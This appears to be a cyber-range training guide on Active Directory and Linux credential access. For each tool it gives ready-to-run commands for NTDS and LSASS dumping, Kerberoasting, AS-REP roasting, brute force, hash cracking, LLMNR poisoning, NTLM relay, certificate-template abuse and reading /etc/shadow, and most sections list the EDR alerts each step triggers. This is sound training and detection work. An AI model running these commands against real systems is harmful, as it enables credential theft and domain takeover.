# Tactic: Credential Access

**MITRE:** TA0006 — Credential Access
**Goal:** Obtain account credentials — hashes, plaintext passwords, Kerberos tickets — through dumping, capture, brute force, and roasting. These credentials fuel lateral movement and privilege escalation.

**Range variables used in this guide**

| Variable | What it represents |
|---|---|
| `<DC_IP>` | Domain Controller IP |
| `<WIN_CLIENT_IP>` | Windows 11 client IP |
| `<LINUX_IP>` | Ubuntu 24.04 target IP |
| `<SUBNET_CIDR>` | Range subnet (e.g. 10.1.0.0/24) |
| `<DOMAIN>` | Active Directory domain name |
| `<USERNAME>` | Domain or local username |
| `<PASSWORD>` | Account password |
| `<NTLM_HASH>` | Captured NTLM hash |

---

## Tool 1 — impacket-secretsdump: Remote NTDS / Hash Dump

**What it does:** Remotely extracts password hashes from a Windows host. Against a Domain Controller it dumps the entire NTDS.dit database — every domain account's NTLM hash, including `krbtgt`. This is the single highest-value credential access technique in an AD environment.

**MITRE:** T1003.003 — OS Credential Dumping: NTDS
**Targets:** DC
**Demo time:** ⚠️ Moderate (~1–2 minutes)

---

### Give it a try

**Step 1 — Dump all domain hashes from the DC using valid credentials**

```
impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
```

**What to look for:** Output lists every domain account in the format `domain\user:RID:LM:NTLM:::`. The `krbtgt` hash enables Golden Ticket attacks; the Administrator hash enables Pass-the-Hash.

**Step 2 — Dump using a hash instead of a password (Pass-the-Hash to secretsdump)**

```
impacket-secretsdump <DOMAIN>/<USERNAME>@<DC_IP> -hashes :<NTLM_HASH>
```

---

📸 **Screenshot:** `screenshots/02-credential-access/01-secretsdump.png`
*Show: secretsdump output — the NTLM hash dump for domain accounts including krbtgt*

**What Cortex sees**
> **Alert:** Suspicious dump of ntds.dit using Shadow Copy with ntdsutil/vssadmin · Registry credentials extraction · SMB Traffic from Non-Standard Process
> **Severity:** High | **MITRE:** T1003.003

📸 **Screenshot:** `screenshots/02-credential-access/01-secretsdump-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 2 — netexec + mimikatz: LSASS Credential Dump

**What it does:** Uses netexec to push a credential-dumping module (mimikatz/nanodump) to a live Windows host and pull plaintext passwords, NTLM hashes, and Kerberos tickets straight from LSASS memory. Captures credentials of users currently or recently logged on.

**MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory
**Targets:** DC · Windows Client
**Demo time:** ✅ Fast (~30 seconds)

---

### Give it a try

**Step 1 — Dump LSASS secrets with the netexec sam/lsa module**

```
netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p '<PASSWORD>' --lsa
```

**Step 2 — Dump the local SAM database**

```
netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p '<PASSWORD>' --sam
```

**What to look for:** `--sam` returns local account hashes; `--lsa` returns cached domain credentials and secrets. These feed directly into lateral movement.

---

📸 **Screenshot:** `screenshots/02-credential-access/02-netexec-lsa-sam.png`
*Show: netexec --lsa / --sam output showing dumped hashes*

**What Cortex sees**
> **Alert:** Mimikatz command-line arguments · Registry credentials extraction · Memory dumping with comsvcs.dll
> **Severity:** High | **MITRE:** T1003.001

📸 **Screenshot:** `screenshots/02-credential-access/02-netexec-lsa-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 3 — impacket-GetUserSPNs: Kerberoasting

**What it does:** Requests Kerberos service tickets (TGS) for accounts that have a Service Principal Name (SPN) set. The ticket is encrypted with the service account's password hash, so it can be cracked offline — no further interaction with the domain required. Service accounts often have weak, non-expiring passwords, making this highly effective.

**MITRE:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
**Targets:** DC
**Demo time:** ✅ Fast (~20 seconds)

---

### Give it a try

**Step 1 — Request TGS tickets for all Kerberoastable accounts**

```
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DC_IP> -request
```

**What to look for:** Output includes `$krb5tgs$` hashes — one per service account with an SPN. Save these to a file for offline cracking (Tool 6).

**Step 2 — Save the hashes to a file for cracking**

```
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile /tmp/kerberoast.txt
```

---

📸 **Screenshot:** `screenshots/02-credential-access/03-kerberoast.png`
*Show: GetUserSPNs output with the $krb5tgs$ hashes for service accounts*

**What Cortex sees**
> **Alert:** Possible Kerberoasting attack · Weakly-Encrypted Kerberos Ticket Requested · Multiple Weakly-Encrypted Kerberos Tickets Received
> **Severity:** High | **MITRE:** T1558.003

📸 **Screenshot:** `screenshots/02-credential-access/03-kerberoast-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 4 — impacket-GetNPUsers: AS-REP Roasting

**What it does:** Targets accounts with "Do not require Kerberos pre-authentication" set. For these accounts, the DC will return an AS-REP encrypted with the user's password hash to *anyone* who asks — no credentials needed. The hash is then cracked offline.

**MITRE:** T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting
**Targets:** DC
**Demo time:** ✅ Fast (~15 seconds)

---

### Give it a try

**Step 1 — Find and roast AS-REP-roastable accounts (no credentials needed)**

```
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile /tmp/users.txt -no-pass -format hashcat
```

**Step 2 — If you have credentials, enumerate roastable accounts automatically**

```
impacket-GetNPUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DC_IP> -request -format hashcat
```

**What to look for:** `$krb5asrep$` hashes. These crack the same way as Kerberoast hashes.

---

📸 **Screenshot:** `screenshots/02-credential-access/04-asrep-roast.png`
*Show: GetNPUsers output with $krb5asrep$ hashes*

**What Cortex sees**
> **Alert:** Possible AS-REP Roasting Attack · Kerberos Pre-Auth Failures by Host
> **Severity:** High | **MITRE:** T1558.004

📸 **Screenshot:** `screenshots/02-credential-access/04-asrep-roast-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 5 — hydra: Online Brute Force

**What it does:** Performs online password guessing against network services (SSH, SMB, RDP, HTTP, etc.) by trying username/password combinations from wordlists. Unlike offline cracking, this tests credentials live against the target — noisy but effective against weak passwords and no lockout policy.

**MITRE:** T1110 — Brute Force
**Targets:** Linux (SSH) · Windows Client / DC (SMB, RDP)
**Demo time:** ⚠️ Moderate (~1–3 minutes depending on wordlist)

---

### Give it a try

**Step 1 — Brute force SSH on the Linux target**

```
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ssh://<LINUX_IP> -t 4
```

**Step 2 — Brute force SMB on a Windows host**

```
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt smb://<WIN_CLIENT_IP>
```

**What to look for:** A green `[22][ssh] host: ... login: ... password: ...` line indicates a successful credential. Keep `-t` low on SSH to avoid connection throttling.

> **Tip:** If `rockyou.txt` is gzipped, decompress it first: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

---

📸 **Screenshot:** `screenshots/02-credential-access/05-hydra-ssh.png`
*Show: hydra output with a successful SSH login found (green line)*

**What Cortex sees**
> **Alert:** Hydra Password Brute-Force Tool Execution · SSH authentication brute force attempts · NTLM Brute Force
> **Severity:** Medium–High | **MITRE:** T1110

📸 **Screenshot:** `screenshots/02-credential-access/05-hydra-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 6 — hashcat: Offline Hash Cracking

**What it does:** Cracks captured hashes offline using wordlists and rules, leveraging GPU/CPU power. This is where the Kerberoast and AS-REP hashes from Tools 3 and 4 become plaintext passwords. Because it runs entirely locally, it generates no network traffic.

**MITRE:** T1110.002 — Brute Force: Password Cracking
**Targets:** Local (Kali) — no target interaction
**Demo time:** ⚠️ Varies (seconds to hours by hash/password strength)

---

### Give it a try

**Step 1 — Crack Kerberoast (TGS) hashes — mode 13100**

```
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

**Step 2 — Crack AS-REP hashes — mode 18200**

```
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt
```

**Step 3 — Crack NTLM hashes — mode 1000**

```
hashcat -m 1000 /tmp/ntlm-hashes.txt /usr/share/wordlists/rockyou.txt
```

**What to look for:** Cracked passwords appear next to their hash, and `--show` re-displays them: `hashcat -m 13100 /tmp/kerberoast.txt --show`

**Common modes reference:**

| Mode | Hash type |
|---|---|
| 1000 | NTLM |
| 13100 | Kerberoast (TGS-REP) |
| 18200 | AS-REP |
| 5600 | NetNTLMv2 (from responder) |

---

📸 **Screenshot:** `screenshots/02-credential-access/06-hashcat-crack.png`
*Show: hashcat cracking a hash — the Status: Cracked line with recovered password*

**What Cortex sees**
> *(Offline — no network detection. hashcat runs entirely on Kali and generates no telemetry on range hosts.)*

---

## Tool 7 — responder: LLMNR / NBT-NS Poisoning *(Manual Capture)*

**What it does:** Listens on the network and answers LLMNR, NBT-NS, and mDNS name-resolution broadcasts, tricking Windows hosts into authenticating to Kali. Captures NetNTLMv2 hashes that can be cracked offline or relayed. This is a *passive listener* — it must run and wait for a victim host to trigger a broadcast.

**MITRE:** T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning
**Targets:** Entire subnet (captures from any Windows host)
**Demo time:** 🕐 Listener — run and wait for traffic

---

### Give it a try

Because responder runs as a listener, capture this one manually using a split terminal (tmux).

**Step 1 — Start a tmux session on Kali**

```
tmux new -s responder
```

**Step 2 — Start responder on the primary interface**

```
sudo responder -I eth0 -wv
```

**Step 3 — Trigger a broadcast from a Windows host** (in another pane, or wait for natural traffic). For example, from the Windows client, access a non-existent share: `net use \\nonexistenthost\share`

**What to look for:** responder prints `[SMB] NTLMv2-SSP Hash : ...` when it captures a hash. Save it and crack with hashcat mode 5600.

---

📸 **Screenshot:** `screenshots/02-credential-access/07-responder-capture.png`
*Show: responder terminal with a captured NTLMv2-SSP hash*

**What Cortex sees**
> **Alert:** NTLM Hash Harvesting · Uncommon WPAD queries
> **Severity:** High | **MITRE:** T1557.001

📸 **Screenshot:** `screenshots/02-credential-access/07-responder-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 8 — coercer + ntlmrelayx: Coerced Authentication Relay *(Manual Capture)*

**What it does:** Two tools working together. `coercer` forces a target (often a DC or machine account) to authenticate to Kali using vulnerabilities like PetitPotam or PrinterBug. `ntlmrelayx` catches that authentication and relays it to another service (LDAP, SMB) to perform actions as the coerced account. Requires two simultaneous processes.

**MITRE:** T1557 — Adversary-in-the-Middle · T1187 — Forced Authentication
**Targets:** DC · Windows Client
**Demo time:** 🕐 Two-process — needs split terminal

---

### Give it a try

Capture this manually using a tmux split (two panes visible in one screenshot).

**Pane 1 — Start the relay listener**

```
impacket-ntlmrelayx -t ldap://<DC_IP> --escalate-user <USERNAME> -smb2support
```

**Pane 2 — Coerce the target to authenticate to Kali**

```
coercer coerce -l <KALI_IP> -t <DC_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>
```

**What to look for:** ntlmrelayx shows an incoming authentication and the relayed action succeeding (e.g. user escalated, or SAM dumped).

---

📸 **Screenshot:** `screenshots/02-credential-access/08-coercer-relay.png`
*Show: tmux split — coercer triggering auth (top) and ntlmrelayx catching + relaying it (bottom)*

**What Cortex sees**
> **Alert:** Machine Account NTLM Relay · Potential NTLM Relay Attack · NTLM Relay
> **Severity:** High | **MITRE:** T1557

📸 **Screenshot:** `screenshots/02-credential-access/08-coercer-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 9 — certipy: AD CS Enumeration & Abuse

**What it does:** Enumerates Active Directory Certificate Services (AD CS) for vulnerable certificate templates and misconfigurations (the ESC1–ESC16 classes). A vulnerable template lets a low-privileged user request a certificate that authenticates as a privileged account — a direct path to domain compromise.

**MITRE:** T1649 — Steal or Forge Authentication Certificates
**Targets:** DC (if AD CS is present)
**Demo time:** ⚠️ Moderate (~1 minute)

---

### Give it a try

**Step 1 — Enumerate AD CS and find vulnerable templates**

```
certipy find -u <USERNAME>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
```

**What to look for:** Templates flagged `[!] Vulnerabilities` with an ESC class (e.g. `ESC1`). These are the exploitable paths.

**Step 2 — Request a certificate from a vulnerable template (ESC1 example)**

```
certipy req -u <USERNAME>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -ca <CA_NAME> -template <TEMPLATE> -upn administrator@<DOMAIN>
```

---

📸 **Screenshot:** `screenshots/02-credential-access/09-certipy-find.png`
*Show: certipy find output with a vulnerable template flagged (ESC class)*

**What Cortex sees**
> **Alert:** The CA policy EditFlags was queried · Suspicious Certutil AD CS contact · A suspicious process enrolled for a certificate
> **Severity:** High | **MITRE:** T1649

📸 **Screenshot:** `screenshots/02-credential-access/09-certipy-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 10 — Linux Credential Harvesting

**What it does:** Once on a Linux host, local credential material lives in predictable places — `/etc/shadow` (password hashes), `.bash_history` (typed secrets), SSH keys, and config files. This covers manually locating and extracting that material.

**MITRE:** T1003.008 — /etc/passwd and /etc/shadow · T1552 — Unsecured Credentials
**Targets:** Linux
**Demo time:** ✅ Fast (~30 seconds)

---

### Give it a try

**Step 1 — Dump shadow hashes (requires root/sudo on the target)**

```
sudo cat /etc/shadow
```

**Step 2 — Search for passwords in history and config files**

```
grep -ri 'password' /home /etc 2>/dev/null | head -20
```

**Step 3 — Read bash history for typed secrets**

```
cat ~/.bash_history
```

**What to look for:** `$6$` hashes in shadow (crack with hashcat mode 1800), plaintext credentials in config files, and secrets typed on the command line.

---

📸 **Screenshot:** `screenshots/02-credential-access/10-linux-creds.png`
*Show: /etc/shadow contents and/or grep hits for password strings*

**What Cortex sees**
> **Alert:** Extracting credentials from Unix files · Reading bash command history file · Possible Search For Password Files
> **Severity:** Medium–High | **MITRE:** T1003.008, T1552

📸 **Screenshot:** `screenshots/02-credential-access/10-linux-creds-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*
